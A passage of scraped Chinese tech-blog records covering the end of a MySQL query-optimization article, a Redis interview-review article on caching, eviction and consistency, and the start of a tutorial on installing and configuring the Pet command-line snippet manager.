,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这里的延迟关联将大大提升查询效率，让MySQL扫描尽可能少的页面，获取需要访问的记录后在根据关联列回原表查询所需要的列。,\n,有时候如果可以使用书签记录上次取数据的位置，那么下次就可以直接从该书签记录的位置开始扫描，这样就可以避免使用,OFFSET,，比如下面的查询：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nSELECT id FROM t LIMIT 10000, 10;\r\n改为：\r\nSELECT id FROM t WHERE id > 10000 LIMIT 10;\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,SELECT ,id ,FROM, ,t, ,LIMIT, ,10000,,, ,10,;,改为：,SELECT ,id ,FROM, ,t, ,WHERE ,id, ,>, ,10000, ,LIMIT, ,10,;, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,其他优化的办法还包括使用预先计算的汇总表，或者关联到一个冗余表，冗余表中只包含主键列和需要做排序的列。,\n,优化UNION,\n,MySQL处理,UNION,的策略是先创建临时表，然后再把各个查询结果插入到临时表中，最后再来做查询。因此很多优化策略在,UNION,查询中都没有办法很好的时候。经常需要手动将,WHERE,、,LIMIT,、,ORDER BY,等字句“下推”到各个子查询中，以便优化器可以充分利用这些条件先优化。,\n,除非确实需要服务器去重，否则就一定要使用,UNION ALL,，如果没有,ALL,关键字，MySQL会给临时表加上,DISTINCT,选项，这会导致整个临时表的数据做唯一性检查，这样做的代价非常高。当然即使使用ALL关键字，MySQL总是将结果放入临时表，然后再读出，再返回给客户端。虽然很多时候没有这个必要，比如有时候可以直接把每个子查询的结果返回给客户端。,\n,结语,\n,理解查询是如何执行以及时间都消耗在哪些地方，再加上一些优化过程的知识，可以帮助大家更好的理解MySQL，理解常见优化技巧背后的原理。希望本文中的原理、示例能够帮助大家更好的将理论和实践联系起来，更多的将理论知识运用到实践中。,\n,其他也没啥说的了，给大家留两个思考题吧，可以在脑袋里想想答案，这也是大家经常挂在嘴边的，但很少有人会思考为什么？,\n,\n,有非常多的程序员在分享时都会抛出这样一个观点：尽可能不要使用存储过程，存储过程非常不容易维护，也会增加使用成本，应该把业务逻辑放到客户端。既然客户端都能干这些事，那为什么还要存储过程？,\n,JOIN,本身也挺方便的，直接查询就好了，为什么还需要视图呢？,\n,\n,参考资料,\n,[1] ,姜承尧 著；MySQL技术内幕-InnoDB存储引擎；机械工业出版社，2013,\n[2] ,Baron Scbwartz 等著；宁海元 周振兴等译；高性能MySQL（第三版）; 电子工业出版社， 2013,\n[3] ,由 B-/B+树看 MySQL索引结构,\n,备注：水平有限，难免疏漏，如果问题请留言,\n\r\n        \r\n        \r\n        \n    ,\n        , ,4, 赞,\n        , 12 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114041/", "url_object_id": "821f7f4efb272c0b6522e2a1e27276be", "front_image_path": "full/a63042e23025aa5a9fbe75d0a79efd00a9a8582f.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "title": "分布式之 Redis 复习精讲", "create_time": "2018/05/28", "vote": "1", "bookmark": "9", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,孤独烟,   ,引言,\n,为什么写这篇文章?,\n,博主的,《分布式之消息队列复习精讲》,得到了大家的好评，内心诚惶诚恐，想着再出一篇关于复习精讲的文章。但是还是要说明一下，复习精讲的文章偏面试准备，真正在开发过程中，还是脚踏实地，一步一个脚印，不要投机取巧。,\n考虑到绝大部分写业务的程序员，在实际开发中使用redis的时候，只会setvalue和getvalue两个操作，对redis整体缺乏一个认知。又恰逢博主某个同事下周要去培训redis，所以博主斗胆以redis为题材，对redis常见问题做一个总结，希望能够弥补大家的知识盲点。,\n,复习要点?,\n,本文围绕以下几点进行阐述,\n1、为什么使用redis,\n2、使用redis有什么缺点,\n3、单线程的redis为什么这么快,\n4、redis的数据类型，以及每种数据类型的使用场景,\n5、redis的过期策略以及内存淘汰机制,\n6、redis和数据库双写一致性问题,\n7、如何应对缓存穿透和缓存雪崩问题,\n8、如何解决redis的并发竞争问题,\n,正文,\n,1、为什么使用redis,\n,分析,:博主觉得在项目中使用redis，主要是从两个角度去考虑:,性能,和,并发,。当然，redis还具备可以做分布式锁等其他功能，但是如果只是为了分布式锁这些其他功能，完全还有其他中间件(如zookpeer等)代替，并不是非要使用redis。因此，这个问题主要从性能和并发两个角度去答。,\n,回答,:如下所示，分为两点,\n,（一）性能,\n如下图所示，我们在碰到需要执行耗时特别久，且结果不频繁变动的SQL，就特别适合将运行结果放入缓存。这样，后面的请求就去缓存中读取，使得请求能够,迅速响应,。,\n,\n,题外话：,忽然想聊一下这个,迅速响应,的标准。其实根据交互效果的不同，这个响应时间没有固定标准。不过曾经有人这么告诉我:”在理想状态下，我们的页面跳转需要在,瞬间,解决，对于页内操作则需要在,刹那,间解决。另外，超过,一弹指,的耗时操作要有进度提示，并且可以随时中止或取消，这样才能给用户最好的体验。”,\n那么,瞬间、刹那、一弹指,具体是多少时间呢？,\n根据《摩诃僧祗律》记载,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n一刹那者为一念，二十念为一瞬，二十瞬为一弹指，二十弹指为一罗预，二十罗预为一须臾，一日一夜有三十须臾。,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,一刹那者为一念，二十念为一瞬，二十瞬为一弹指，二十弹指为一罗预，二十罗预为一须臾，一日一夜有三十须臾。,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,那么，经过周密的计算，一,瞬间,为0.36 秒,一,刹那,有 0.018 秒.一,弹指,长达 7.2 秒。,\n,（二）并发,\n如下图所示，在大并发的情况下，所有的请求直接访问数据库，数据库会出现连接异常。这个时候，就需要使用redis做一个缓冲操作，让请求先访问到redis，而不是直接访问数据库。,\n,\n,2、使用redis有什么缺点,\n,分析,:大家用redis这么久，这个问题是必须要了解的，基本上使用redis都会碰到一些问题，常见的也就几个。,\n,回答,:主要是四个问题,\n(一)缓存和数据库双写一致性问题,\n(二)缓存雪崩问题,\n(三)缓存击穿问题,\n(四)缓存的并发竞争问题,\n这四个问题，我个人是觉得在项目中，比较常遇见的，具体解决方案，后文给出。,\n,3、单线程的redis为什么这么快,\n,分析,:这个问题其实是对redis内部机制的一个考察。其实根据博主的面试经验，很多人其实都不知道redis是单线程工作模型。所以，这个问题还是应该要复习一下的。,\n,回答,:主要是以下三点,\n(一)纯内存操作,\n(二)单线程操作，避免了频繁的上下文切换,\n(三)采用了非阻塞,I/O多路复用机制,\n,题外话：,我们现在要仔细的说一说I/O多路复用机制，因为这个说法实在是太通俗了，通俗到一般人都不懂是什么意思。博主打一个比方：小曲在S城开了一家快递店，负责同城快送服务。小曲因为资金限制，雇佣了,一批,快递员，然后小曲发现资金不够了，只够买,一辆,车送快递。,\n,经营方式一,\n客户每送来一份快递，小曲就让一个快递员盯着，然后快递员开车去送快递。慢慢的小曲就发现了这种经营方式存在下述问题,\n,\n,几十个快递员基本上时间都花在了抢车上了，大部分快递员都处在闲置状态，谁抢到了车，谁就能去送快递,\n,随着快递的增多，快递员也越来越多，小曲发现快递店里越来越挤，没办法雇佣新的快递员了,\n,快递员之间的协调很花时间,\n,\n,综合上述缺点，小曲痛定思痛，提出了下面的经营方式,\n,经营方式二,\n小曲只雇佣一个快递员。然后呢，客户送来的快递，小曲按,送达地点,标注好，然后,依次,放在一个地方。最后，那个快递员,依次,的去取快递，一次拿一个，然后开着车去送快递，送好了就回来拿下一个快递。,\n,对比,\n上述两种经营方式对比，是不是明显觉得第二种，效率更高，更好呢。在上述比喻中:,\n,\n,每个快递员——————>每个线程,\n,每个快递——————–>每个socket(I/O流),\n,快递的送达地点————–>socket的不同状态,\n,客户送快递请求————–>来自客户端的请求,\n,小曲的经营方式————–>服务端运行的代码,\n,一辆车———————->CPU的核数,\n,\n,于是我们有如下结论,\n1、经营方式一就是传统的并发模型，每个I/O流(快递)都有一个新的线程(快递员)管理。,\n2、经营方式二就是I/O多路复用。只有单个线程(一个快递员)，通过跟踪每个I/O流的状态(每个快递的送达地点)，来管理多个I/O流。,\n,下面类比到真实的redis线程模型，如图所示,\n,\n参照上图，简单来说，就是。我们的redis-client在操作的时候，会产生具有不同事件类型的socket。在服务端，有一段I/0多路复用程序，将其置入队列之中。然后，文件事件分派器，依次去队列中取，转发到不同的事件处理器中。,\n需要说明的是，这个I/O多路复用机制，redis还提供了select、epoll、evport、kqueue等多路复用函数库，大家可以自行去了解。,\n,4、redis的数据类型，以及每种数据类型的使用场景,\n,分析,：是不是觉得这个问题很基础，其实我也这么觉得。然而根据面试经验发现，至少百分八十的人答不上这个问题。建议，在项目中用到后，再类比记忆，体会更深，不要硬记。基本上，一个合格的程序员，五种类型都会用到。,\n,回答,：一共五种,\n(一)String,\n这个其实没啥好说的，最常规的set/get操作，value可以是String也可以是数字。一般做,一些复杂的计数功能的缓存。,\n(二)hash,\n这里value存放的是结构化的对象，比较方便的就是操作其中的某个字段。博主在做,单点登录,的时候，就是用这种数据结构存储用户信息，以cookieId作为key，设置30分钟为缓存过期时间，能很好的模拟出类似session的效果。,\n(三)list,\n使用List的数据结构，可以,做简单的消息队列的功能,。另外还有一个就是，可以利用lrange命令，,做基于redis的分页功能,，性能极佳，用户体验好。,\n(四)set,\n因为set堆放的是一堆不重复值的集合。所以可以做,全局去重的功能,。为什么不用JVM自带的Set进行去重？因为我们的系统一般都是集群部署，使用JVM自带的Set，比较麻烦，难道为了一个做一个全局去重，再起一个公共服务，太麻烦了。,\n另外，就是利用交集、并集、差集等操作，可以,计算共同喜好，全部的喜好，自己独有的喜好等功能,。,\n(五)sorted set,\nsorted set多了一个权重参数score,集合中的元素能够按score进行排列。可以做,排行榜应用，取TOP N操作,。另外，参照另一篇,《分布式之延时任务方案解析》,，该文指出了sorted set可以用来做,延时任务,。最后一个应用就是可以做,范围查找,。,\n,5、redis的过期策略以及内存淘汰机制,\n,分析,:这个问题其实相当重要，到底redis有没用到家，这个问题就可以看出来。比如你redis只能存5G数据，可是你写了10G，那会删5G的数据。怎么删的，这个问题思考过么？还有，你的数据已经设置了过期时间，但是时间到了，内存占用率还是比较高，有思考过原因么?,\n,回答,:,\nredis采用的是定期删除+惰性删除策略。,\n,为什么不用定时删除策略?,\n定时删除,用一个定时器来负责监视key,过期则自动删除。虽然内存及时释放，但是十分消耗CPU资源。在大并发请求下，CPU要将时间应用在处理请求，而不是删除key,因此没有采用这一策略.,\n,定期删除+惰性删除是如何工作的呢?,\n定期删除，redis默认每个100ms检查，是否有过期的key,有过期key则删除。需要说明的是，redis不是每个100ms将所有的key检查一次，而是随机抽取进行检查(如果每隔100ms,全部key进行检查，redis岂不是卡死)。因此，如果只采用定期删除策略，会导致很多key到时间没有删除。,\n于是，惰性删除派上用场。也就是说在你获取某个key的时候，redis会检查一下，这个key如果设置了过期时间那么是否过期了？如果过期了此时就会删除。,\n,采用定期删除+惰性删除就没其他问题了么?,\n不是的，如果定期删除没删除key。然后你也没即时去请求key，也就是说惰性删除也没生效。这样，redis的内存会越来越高。那么就应该采用,内存淘汰机制,。,\n在redis.conf中有一行配置,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# maxmemory-policy volatile-lru,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# maxmemory-policy volatile-lru,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,该配置就是配内存淘汰策略的(什么，你没配过？好好反省一下自己),\n1）noeviction：当内存不足以容纳新写入数据时，新写入操作会报错。,应该没人用吧。,\n2）allkeys-lru：当内存不足以容纳新写入数据时，在键空间中，移除最近最少使用的key。,推荐使用，目前项目在用这种。,\n3）allkeys-random：当内存不足以容纳新写入数据时，在键空间中，随机移除某个key。,应该也没人用吧，你不删最少使用Key,去随机删。,\n4）volatile-lru：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，移除最近最少使用的key。,这种情况一般是把redis既当缓存，又做持久化存储的时候才用。不推荐,\n5）volatile-random：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，随机移除某个key。,依然不推荐,\n6）volatile-ttl：当内存不足以容纳新写入数据时，在设置了过期时间的键空间中，有更早过期时间的key优先移除。,不推荐,\nps：如果没有设置 expire 的key, 不满足先决条件(prerequisites); 那么 volatile-lru, volatile-random 和 volatile-ttl 策略的行为, 和 noeviction(不删除) 基本上一致。,\n,6、redis和数据库双写一致性问题,\n,分析,:一致性问题是分布式常见问题，还可以再分为最终一致性和强一致性。数据库和缓存双写，就必然会存在不一致的问题。答这个问题，先明白一个前提。就是,如果对数据有强一致性要求，不能放缓存。,我们所做的一切，只能保证最终一致性。另外，我们所做的方案其实从根本上来说，只能说,降低不一致发生的概率,，无法完全避免。因此，有强一致性要求的数据，不能放缓存。,\n,回答,:,《分布式之数据库和缓存双写一致性方案解析》,给出了详细的分析，在这里简单的说一说。首先，采取正确更新策略，先更新数据库，再删缓存。其次，因为可能存在删除缓存失败的问题，提供一个补偿措施即可，例如利用消息队列。,\n,7、如何应对缓存穿透和缓存雪崩问题,\n,分析,:这两个问题，说句实在话，一般中小型传统软件企业，很难碰到这个问题。如果有大并发的项目，流量有几百万左右。这两个问题一定要深刻考虑。,\n,回答,:如下所示,\n,缓存穿透,，即黑客故意去请求缓存中不存在的数据，导致所有的请求都怼到数据库上，从而数据库连接异常。,\n,解决方案,:,\n(一)利用互斥锁，缓存失效的时候，先去获得锁，得到锁了，再去请求数据库。没得到锁，则休眠一段时间重试,\n(二)采用异步更新策略，无论key是否取到值，都直接返回。value值中维护一个缓存失效时间，缓存如果过期，异步起一个线程去读数据库，更新缓存。需要做,缓存预热,(项目启动前，先加载缓存)操作。,\n(三)提供一个能迅速判断请求是否有效的拦截机制，比如，利用布隆过滤器，内部维护一系列合法有效的key。迅速判断出，请求所携带的Key是否合法有效。如果不合法，则直接返回。,\n,缓存雪崩,，即缓存同一时间大面积的失效，这个时候又来了一波请求，结果请求都怼到数据库上，从而导致数据库连接异常。,\n,解决方案,:,\n(一)给缓存的失效时间，加上一个随机值，避免集体失效。,\n(二)使用互斥锁，但是该方案吞吐量明显下降了。,\n(三)双缓存。我们有两个缓存，缓存A和缓存B。缓存A的失效时间为20分钟，缓存B不设失效时间。自己做缓存预热操作。然后细分以下几个小点,\n,\n,I 从缓存A读数据库，有则直接返回,\n,II A没有数据，直接从B读数据，直接返回，并且异步启动一个更新线程。,\n,III 更新线程同时更新缓存A和缓存B。,\n,\n,8、如何解决redis的并发竞争key问题,\n,分析,:这个问题大致就是，同时有多个子系统去set一个key。这个时候要注意什么呢？大家思考过么。需要说明一下，博主提前百度了一下，发现答案基本都是推荐用redis事务机制。博主,不推荐使用redis的事务机制。,因为我们的生产环境，基本都是redis集群环境，做了数据分片操作。你一个事务中有涉及到多个key操作的时候，这多个key不一定都存储在同一个redis-server上。因此，,redis的事务机制，十分鸡肋。,\n,回答:,如下所示,\n(1)如果对这个key操作，,不要求顺序,\n这种情况下，准备一个分布式锁，大家去抢锁，抢到锁就做set操作即可，比较简单。,\n(2)如果对这个key操作，,要求顺序,\n假设有一个key1,系统A需要将key1设置为valueA,系统B需要将key1设置为valueB,系统C需要将key1设置为valueC.,\n期望按照key1的value值按照 valueA–>valueB–>valueC的顺序变化。这种时候我们在数据写入数据库的时候，需要保存一个时间戳。假设时间戳如下,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n系统A key 1 {valueA  3:00}\r\n系统B key 1 {valueB  3:05}\r\n系统C key 1 {valueC  3:10},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,系统,A, ,key, ,1, ,{,valueA,  ,3,:,00,},系统,B, ,key, ,1, ,{,valueB,  ,3,:,05,},系统,C, ,key, ,1, ,{,valueC,  ,3,:,10,},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,那么，假设这会系统B先抢到锁，将key1设置为{valueB 3:05}。接下来系统A抢到锁，发现自己的valueA的时间戳早于缓存中的时间戳，那就不做set操作了。以此类推。,\n,其他方法，比如利用队列，将set方法变成串行访问也可以。总之，灵活变通。,\n,总结,\n,本文对redis的常见问题做了一个总结。大部分是博主自己在工作中遇到，以及以前面试别人的时候，爱问的一些问题。另外，,不推荐大家临时抱佛脚,，真正碰到一些有经验的工程师，其实几下就能把你问懵。最后，希望大家有所收获吧。,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 9 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114050/", "url_object_id": "ab6b90e6a2bac7d584de17cc2fd8106c", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/05/310d11635ef5716e4028f2035c080286.png"], "title": "Pet：一个简单的命令行片段管理器", "create_time": "2018/05/07", "vote": "1", "bookmark": 0, "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,SK,   译文出处：,Linux中国/MjSeven,   ,\n,我们不可能记住所有的命令，对吧？是的。除了经常使用的命令之外，我们几乎不可能记住一些很少使用的长命令。这就是为什么需要一些外部工具来帮助我们在需要时找到命令。在过去，我们已经点评了两个有用的工具，名为 “Bashpast” 和 “Keep”。使用 Bashpast，我们可以轻松地为 Linux 命令添加书签，以便更轻松地重复调用。而 Keep 实用程序可以用来在终端中保留一些重要且冗长的命令，以便你可以随时使用它们。今天，我们将看到该系列中的另一个工具，以帮助你记住命令。现在让我们认识一下 “Pet”，这是一个用 Go 语言编写的简单的命令行代码管理器。,\n,使用 Pet，你可以：,\n,\n,注册/添加你重要的、冗长和复杂的命令片段。,\n,以交互方式来搜索保存的命令片段。,\n,直接运行代码片段而无须一遍又一遍地输入。,\n,轻松编辑保存的代码片段。,\n,通过 Gist 同步片段。,\n,在片段中使用变量,\n,还有很多特性即将来临。,\n,\n,安装 Pet 命令行接口代码管理器,\n,由于它是用 Go 语言编写的，所以确保你在系统中已经安装了 Go。,\n,安装 Go 后，从 ,Pet 发布页面, 获取最新的二进制文件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nwget https://github.com/knqyf263/pet/releases/download/v0.2.4/pet_0.2.4_linux_amd64.zip\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,wget ,https,:,//github.com/knqyf263/pet/releases/download/v0.2.4/pet_0.2.4_linux_amd64.zip, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,对于 32 位计算机：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nwget https://github.com/knqyf263/pet/releases/download/v0.2.4/pet_0.2.4_linux_386.zip\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,wget ,https,:,//github.com/knqyf263/pet/releases/download/v0.2.4/pet_0.2.4_linux_386.zip, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,解压下载的文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nunzip pet_0.2.4_linux_amd64.zip\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,unzip ,pet_0,.,2.4_linux_amd64.zip, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,对于 32 位：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nunzip pet_0.2.4_linux_386.zip\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,unzip ,pet_0,.,2.4_linux_386.zip, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,将 ,pet, 二进制文件复制到 PATH（即 ,/usr/local/bin, 之类的）。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo cp pet /usr/local/bin/\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,cp ,pet, ,/,usr,/,local,/,bin,/, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,最后，让它可以执行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo chmod +x /usr/local/bin/pet\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,chmod, ,+,x, ,/,usr,/,local,/,bin,/,pet, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,如果你使用的是基于 Arch 的系统，那么你可以使用任何 AUR 帮助工具从 AUR 安装它。,\n,使用 ,Pacaur,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npacaur -S pet-git\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,pacaur, ,-,S, ,pet,-,git, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用 ,Packer,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\npacker -S pet-git\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,packer, ,-,S, ,pet,-,git, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用 ,Yaourt,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nyaourt -S pet-git\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,yaourt, ,-,S, ,pet,-,git, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,使用 ,Yay,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nyay -S pet-git\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,yay, ,-,S, ,pet,-,git, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,此外，你需要安装 ,fzf, 或 ,peco, 工具以启用交互式搜索。请参阅官方 GitHub 链接了解如何安装这些工具。,\n,用法,\n,运行没有任何参数的 ,pet, 来查看可用命令和常规选项的列表。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet\r\npet - Simple command-line snippet manager.\r\n\r\nUsage:\r\n pet [command]\r\n\r\nAvailable Commands:\r\n configure Edit config file\r\n edit Edit snippet file\r\n exec Run the selected commands\r\n help Help about any command\r\n list Show all snippets\r\n new Create a new snippet\r\n search Search snippets\r\n sync Sync snippets\r\n version Print the version number\r\n\r\nFlags:\r\n --config string config file (default is $HOME/.config/pet/config.toml)\r\n --debug debug mode\r\n -h, --help help for pet\r\n\r\nUse \"pet [command] --help\" for more information about a command.\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet,pet, ,-, ,Simple ,command,-,line ,snippet ,manager,., ,Usage,:, ,pet, ,[,command,], ,Available ,Commands,:, ,configure ,Edit ,config ,file, ,edit ,Edit ,snippet ,file, ,exec ,Run ,the ,selected ,commands, ,help ,Help ,about ,any ,command, ,list ,Show ,all ,snippets, ,new, ,Create, ,a, ,new, ,snippet, ,search ,Search ,snippets, ,sync ,Sync ,snippets, ,version ,Print ,the ,version ,number, ,Flags,:, ,--,config ,string, ,config ,file, ,(,default, ,is, ,$,HOME,/,.,config,/,pet,/,config,.,toml,), ,--,debug ,debug ,mode, ,-,h,,, ,--,help ,help ,for, ,pet, ,Use, ,\"pet [command] --help\", ,for, ,more ,information ,about, ,a, ,command,., ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,要查看特定命令的帮助部分，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet [command] --help\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet, ,[,command,], ,--,help, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,配置 Pet,\n,默认配置其实工作的挺好。但是，你可以更改保存片段的默认目录，选择要使用的选择器（fzf 或 peco），编辑片段的默认文本编辑器，添加 GIST id 详细信息等。,\n,要配置 Pet，运行：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ pet configure\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,pet ,configure, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,该命令将在默认的文本编辑器中打开默认配置（例如我是 vim），根据你的要求更改或编辑特定值。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n[General]\r\n snippetfile = \"/home/sk/.config/pet/snippet.toml\"\r\n editor = \"vim\"\r\n column = 40\r\n selectcmd = \"fzf\"\r\n\r\n[Gist]\r\n file_name = \"pet-snippet.toml\"\r\n access_token = \"\"\r\n gist_id = \"\"\r\n public = false\r\n~\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,[,General,], ,snippetfile, ,=, ,\"/home/sk/.config/pet/snippet.toml\", ,editor, ,=, ,\"vim\", ,column, ,=, ,40, ,selectcmd, ,=, ,\"fzf\", ,[,Gist,], ,file_name, ,=, ,\"pet-snippet.toml\", ,access_token, 